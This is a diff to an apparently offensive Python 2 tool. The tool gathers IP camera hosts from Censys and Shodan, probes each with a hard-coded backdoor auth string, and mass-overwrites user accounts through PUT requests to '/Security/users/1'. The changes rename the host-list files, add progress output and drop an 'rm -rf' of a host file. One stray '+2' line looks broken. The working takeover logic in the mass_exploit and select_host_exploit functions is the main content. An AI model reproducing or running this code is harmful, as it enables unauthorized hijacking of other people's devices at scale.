@@ -13,6 +13,7 @@ import json
 import censys
 import censys.ipv4
 from censys.base import CensysException
+import webbrowser
 
 global path
 global host
@@ -22,7 +23,8 @@ userID = ""
 userName = ""
 newPass = ""
 host = open(path + '/host.txt' , 'r').read().splitlines()
-vuln_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
+up_host = open(path + '/up_host.txt', 'r').read().splitlines()
+vulnerable_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
 BackdoorAuthArg = "auth=YWRtaW46MTEK"
 def usage():
     print (""" ____  ____   _   __                       __           _   _    
@@ -87,10 +89,11 @@ def gather_host_censys():
                 with open(path + '/host.txt',"a") as cen:
                     cen.write(ip +":" + str(port[0]))
                     cen.write("\n")
+        except KeyboardInterrupt:
+            pass
         except CensysException:
             pass
-                
-                
+2
     
 
 
@@ -102,8 +105,9 @@ def mass_exploit():
     pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
     pattern_2 = r'(\:).*'
     a = 0
-    while a < len(host):
-        res = host[a]
+    while a < len(vulnerable_host):
+        res = vulnerable_host[a]
+        print res
         match1 = re.search(pattern_1, res)
         match2 = re.search(pattern_2, res)
         target_host = match1.group()
@@ -117,7 +121,6 @@ def mass_exploit():
         URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
         x = requests.put(URLUpload, data=userXML).text
         a += 1
-
 def select_host_exploit():
     global target_host
     global port
@@ -126,13 +129,13 @@ def select_host_exploit():
     pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
     pattern_2 = r'(\:).*'
     b = 0
-    while b < len(host):
-        res = host[b]
-        print str(b) + ". " + host[b]
+    while b < len(vulnerable_host):
+        res = vulnerable_host[b]
+        print str(b) + ". " + vulnerable_host[b]
         print "\n"
         b += 1
     sel = raw_input('[+]'+"please select a number for a specific host to hack:")
-    res = host[int(sel)]
+    res = vulnerable_host[int(sel)]
     match1 = re.search(pattern_1 , res)
     match2 = re.search(pattern_2 , res)
     target_host = match1.group()
@@ -221,7 +224,7 @@ def random_host_exploit():
         print('[*]'+"Something went wrong!")
         print a
 
-def vuln_scan():
+def up_scan():
     print"[+]Loading all host..."
     a = 0
     try:
@@ -248,7 +251,7 @@ def vuln_scan():
             except KeyboardInterrupt:
                 print ("\n[---]exiting now[---]")
             if x == True:
-                with open(path + '/vuln_host.txt',"a") as host_up:
+                with open(path + '/up_host.txt',"a") as host_up:
                     host_up.write(target_host + ":" + port + "\n")
             elif x == False:
                 pass
@@ -257,15 +260,15 @@ def vuln_scan():
     except KeyboardInterrupt:
         print ("\n[---]exiting now[---]")
 def vuln_scan_exp():
-    os.system("rm -rf " + path + "/host.txt")
-    open(path + '/host.txt', 'w')
     p = 0
-    while p < len(vuln_host):
-        ip_to_check = vuln_host[p]
+    while p < len(up_host):
+        ip_to_check = up_host[p]
         try:
+            sys.stdout.write("\r"+ "[##]Checking "+ ip_to_check)
+            sys.stdout.flush()
             response = requests.get('http://'+ip_to_check+'/security/users/1?'+ BackdoorAuthArg)
             if response.status_code == 200:
-                with open(path + '/host.txt' , 'a') as host_vuln:
+                with open(path + '/vuln_host.txt' , 'a') as host_vuln:
                     host_vuln.write(ip_to_check + "\n")
             elif response.status_code ==401:
                 pass
@@ -280,7 +283,7 @@ def vuln_scan_exp():
         
     
 def scan():
-    vuln_scan()
+    up_scan()
     #vuln_scan_exp()
 
 def install_dependence():
@@ -299,7 +302,7 @@ def install_dependence():
     
 def response():
     global usage
-    usage_str = raw_input('[#]Select an option:')
+    usage_str = raw_input('\n[#]Select an option:')
     if str(usage_str) == "1":
         gather_host_shodan()
         response()
